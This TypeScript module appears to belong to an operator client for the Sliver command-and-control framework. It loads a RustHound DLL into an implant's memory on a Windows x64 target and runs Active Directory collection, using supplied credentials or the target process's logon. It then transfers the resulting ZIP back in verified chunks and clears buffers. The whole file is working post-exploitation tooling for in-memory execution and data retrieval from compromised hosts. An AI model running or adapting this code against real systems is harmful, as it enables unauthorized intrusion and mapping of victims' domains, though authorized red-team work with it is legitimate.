import { createHash, randomUUID } from "node:crypto";
import { join } from "node:path";

import { sliverpb, type clientpb } from "sliver-script";
import { parseAdDomain, type RUSTHOUND_COLLECTION_METHODS } from "../shared/ad-explorer-contracts.js";
import type { TargetSummary } from "../shared/target-contracts.js";
import { isCompleteZipEnvelope } from "./ad-collector.js";
import { isWindowsAmd64 } from "./rusthound-armory.js";
import { writePrivateFileExclusiveAtomic } from "./secure-file.js";
import type { SliverClientAdapter } from "./sliver-client-adapter.js";

export const RUSTHOUND_COLLECTION_MAX_BYTES = 64 * 1024 * 1024;
const CHUNK_BYTES = 32 * 1024;
const POLL_MS = 15_000;
const EXECUTION_DEADLINE_MS = 45 * 60_000;
const TRANSFER_DEADLINE_MS = 3 * 60 * 60_000;
const TASK_TIMEOUT_SECONDS = 120;
const RESPONSE_MAX_BYTES = 64 * 1024;

export type RustHoundMethod = (typeof RUSTHOUND_COLLECTION_METHODS)[number];
export type RustHoundClient = Pick<SliverClientAdapter,
  "registerAdCollectorSession" | "registerAdCollectorBeacon" | "callAdCollectorSession" |
  "callAdCollectorBeacon" | "fetchAdCollectorBeaconTask">;

export interface CollectRustHoundInput {
  client: RustHoundClient;
  target: TargetSummary;
  dll: Buffer;
  domain: string;
  ldapFqdn?: string;
  ldaps?: boolean;
  method: RustHoundMethod;
  /** Omitted to use the target process's Windows logon. */
  credentials?: { username: string; password: string };
  collectionRoot: string;
  assertCurrent: () => void;
  now?: () => number;
  delay?: (milliseconds: number) => Promise<void>;
}

type ProtocolResponse = Record<string, unknown> & { version: 1; state: string };

function protocolResponse(output: Buffer): ProtocolResponse {
  if (!output.length || output.length > RESPONSE_MAX_BYTES) throw new Error("RustHound returned an invalid response size");
  let value: unknown;
  try { value = JSON.parse(new TextDecoder("utf-8", { fatal: true }).decode(output)) as unknown; }
  catch { throw new Error("RustHound returned an invalid response frame"); }
  if (!value || typeof value !== "object" || Array.isArray(value) ||
      (value as Record<string, unknown>)["version"] !== 1 ||
      typeof (value as Record<string, unknown>)["state"] !== "string") {
    throw new Error("RustHound returned an unsupported response frame");
  }
  return value as ProtocolResponse;
}

function runId(response: ProtocolResponse): string {
  const value = response["runId"];
  if (typeof value !== "string" || !/^[a-f0-9]{1,16}$/u.test(value)) {
    throw new Error("RustHound returned an invalid collection ID");
  }
  return value;
}

function taskId(response: { Async: boolean; TaskID: string; BeaconID: string } | undefined, beaconId: string): string {
  if (!response?.Async || response.BeaconID !== beaconId ||
      !/^[A-Za-z0-9_-]{1,128}$/u.test(response.TaskID)) {
    throw new Error("The beacon did not return a correlated RustHound task");
  }
  return response.TaskID;
}

function completedBeaconTask(task: clientpb.BeaconTask): boolean {
  const state = task.State.trim().toLowerCase();
  if (state === "completed") return true;
  if (state === "failed" || state === "cancelled" || state === "canceled") {
    throw new Error("The RustHound beacon task failed");
  }
  if (state !== "pending" && state !== "sent") throw new Error("Unknown RustHound beacon task state");
  return false;
}

async function waitBeaconTask(
  input: CollectRustHoundInput, id: string, kind: "register" | "call", extensionName: string, deadline: number,
  now: () => number, delay: (milliseconds: number) => Promise<void>,
): Promise<Buffer> {
  while (now() < deadline) {
    input.assertCurrent();
    const task = await input.client.fetchAdCollectorBeaconTask(input.target.id, id, kind, extensionName, 30);
    try {
      input.assertCurrent();
      if (completedBeaconTask(task)) {
        if (!task.Response.length) throw new Error("The RustHound beacon task returned no response");
        return Buffer.from(task.Response);
      }
    } finally { task.Request.fill(0); task.Response.fill(0); }
    await delay(Math.min(POLL_MS, Math.max(0, deadline - now())));
  }
  throw new Error("The RustHound beacon task did not complete before its deadline");
}

async function register(
  input: CollectRustHoundInput, now: () => number, delay: (milliseconds: number) => Promise<void>,
): Promise<string> {
  input.assertCurrent();
  const name = createHash("sha256").update(input.dll).digest("hex");
  const response = input.target.mode === "session"
    ? await input.client.registerAdCollectorSession(input.target.id, input.dll, TASK_TIMEOUT_SECONDS)
    : await input.client.registerAdCollectorBeacon(input.target.id, input.dll, TASK_TIMEOUT_SECONDS);
  if (response.Response?.Err?.trim()) throw new Error("The target rejected the RustHound extension");
  if (input.target.mode === "beacon") {
    const id = taskId(response.Response, input.target.id);
    const bytes = await waitBeaconTask(input, id, "register", name, now() + EXECUTION_DEADLINE_MS, now, delay);
    try {
      const completed = sliverpb.RegisterExtension.decode(bytes);
      if (completed.Response?.Err?.trim()) throw new Error("The beacon could not load RustHound in memory");
    } finally { bytes.fill(0); }
  }
  input.assertCurrent();
  return name;
}

async function call(
  input: CollectRustHoundInput, extensionName: string, request: Record<string, unknown>,
  deadline: number, now: () => number, delay: (milliseconds: number) => Promise<void>,
): Promise<ProtocolResponse> {
  input.assertCurrent();
  const args = Buffer.from(JSON.stringify({ version: 1, ...request }), "utf8");
  let response: sliverpb.CallExtension;
  try {
    response = input.target.mode === "session"
      ? await input.client.callAdCollectorSession(input.target.id, extensionName, args, TASK_TIMEOUT_SECONDS)
      : await input.client.callAdCollectorBeacon(input.target.id, extensionName, args, TASK_TIMEOUT_SECONDS);
  } finally { args.fill(0); }
  if (response.Response?.Err?.trim()) {
    response.Output.fill(0);
    throw new Error("The target rejected a RustHound command");
  }
  if (input.target.mode === "beacon") {
    response.Output.fill(0);
    const id = taskId(response.Response, input.target.id);
    const bytes = await waitBeaconTask(input, id, "call", extensionName, deadline, now, delay);
    try {
      response = sliverpb.CallExtension.decode(bytes);
    } finally { bytes.fill(0); }
  }
  try {
    input.assertCurrent();
    if (response.Response?.Err?.trim()) throw new Error("The RustHound extension returned an execution error");
    return protocolResponse(response.Output);
  } finally { response.Output.fill(0); }
}

function completeStatus(response: ProtocolResponse, expectedId: string): { size: number; sha256: string } | null {
  if (runId(response) !== expectedId) throw new Error("RustHound changed the collection ID");
  if (response.state === "running") return null;
  if (response.state !== "complete") throw new Error("RustHound collection failed on the target");
  const size = response["size"];
  const sha256 = response["sha256"];
  if (typeof size !== "number" || !Number.isSafeInteger(size) || size < 1 || size > RUSTHOUND_COLLECTION_MAX_BYTES ||
      typeof sha256 !== "string" || !/^[a-f0-9]{64}$/u.test(sha256)) {
    throw new Error("RustHound returned invalid collection metadata");
  }
  return { size, sha256 };
}

function readChunk(response: ProtocolResponse, expectedId: string, expectedOffset: number, size: number): Buffer {
  if (response.state !== "chunk" || runId(response) !== expectedId || response["offset"] !== expectedOffset ||
      typeof response["nextOffset"] !== "number" || !Number.isSafeInteger(response["nextOffset"]) ||
      response["nextOffset"] <= expectedOffset || response["nextOffset"] > size ||
      typeof response["data"] !== "string" || response["data"].length > Math.ceil(CHUNK_BYTES / 3) * 4 + 4 ||
      !/^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/u.test(response["data"])) {
    throw new Error("RustHound returned an invalid collection chunk");
  }
  const chunk = Buffer.from(response["data"], "base64");
  if (!chunk.length || chunk.length > CHUNK_BYTES || expectedOffset + chunk.length !== response["nextOffset"]) {
    chunk.fill(0);
    throw new Error("RustHound returned a mismatched collection chunk");
  }
  return chunk;
}

/** Runs a signed Armory DLL entirely from implant memory and saves only a verified client-side ZIP. */
export async function collectRustHound(input: CollectRustHoundInput): Promise<string> {
  const now = input.now ?? Date.now;
  const delay = input.delay ?? ((milliseconds: number) => new Promise<void>((resolve) => setTimeout(resolve, milliseconds)));
  const domain = parseAdDomain(input.domain);
  if (!isWindowsAmd64(input.target)) {
    throw new Error("RustHound requires a Windows x64 target");
  }
  if (input.target.mode === "session" && input.target.liveness !== "active") {
    throw new Error("The selected Windows session is no longer active");
  }
  if (input.credentials && (!input.credentials.username || !input.credentials.password)) {
    throw new Error("RustHound requires both a user name and password for explicit authentication");
  }
  let zip: Buffer | undefined;
  let id: string | undefined;
  let finished = false;
  const extensionName = await register(input, now, delay);
  const deadline = now() + EXECUTION_DEADLINE_MS;
  try {
    const started = await call(input, extensionName, {
      op: "start", domain, method: input.method,
      ...(input.ldapFqdn ? { ldapFqdn: input.ldapFqdn } : {}), ...(input.ldaps ? { ldaps: true } : {}),
      ...(input.credentials ? { username: input.credentials.username, password: input.credentials.password } : { currentUser: true }),
      maxBytes: RUSTHOUND_COLLECTION_MAX_BYTES,
      timeoutSeconds: Math.floor(EXECUTION_DEADLINE_MS / 1000),
    }, deadline, now, delay);
    if (started.state !== "running") throw new Error("RustHound did not start collection");
    id = runId(started);
    let metadata: { size: number; sha256: string } | null = null;
    while (now() < deadline && !metadata) {
      input.assertCurrent();
      const status = await call(input, extensionName, { op: "status", runId: id }, deadline, now, delay);
      metadata = completeStatus(status, id);
      if (!metadata) await delay(Math.min(POLL_MS, Math.max(0, deadline - now())));
    }
    if (!metadata) throw new Error("RustHound collection timed out");
    zip = Buffer.alloc(metadata.size);
    let offset = 0;
    const transferDeadline = now() + TRANSFER_DEADLINE_MS;
    while (offset < metadata.size) {
      if (now() >= transferDeadline) throw new Error("RustHound transfer timed out");
      input.assertCurrent();
      const response = await call(input, extensionName, {
        op: "read", runId: id, offset, maxBytes: Math.min(CHUNK_BYTES, metadata.size - offset),
      }, transferDeadline, now, delay);
      const chunk = readChunk(response, id, offset, metadata.size);
      try { chunk.copy(zip, offset); offset += chunk.length; }
      finally { chunk.fill(0); }
    }
    if (createHash("sha256").update(zip).digest("hex") !== metadata.sha256 || !isCompleteZipEnvelope(zip)) {
      throw new Error("RustHound did not return a complete, verified ZIP archive");
    }
    const finishedResponse = await call(input, extensionName, { op: "finish", runId: id }, transferDeadline, now, delay);
    if (finishedResponse.state !== "finished" || runId(finishedResponse) !== id) {
      throw new Error("RustHound did not release its collection from target memory");
    }
    finished = true;
    input.assertCurrent();
    const path = join(input.collectionRoot, domain, `rusthound-${randomUUID()}.zip`);
    await writePrivateFileExclusiveAtomic(path, zip, input.assertCurrent);
    return path;
  } finally {
    if (id && !finished) {
      await call(input, extensionName, { op: "abort", runId: id }, now() + TASK_TIMEOUT_SECONDS * 1000, now, delay).catch(() => undefined);
    }
    zip?.fill(0);
  }
}
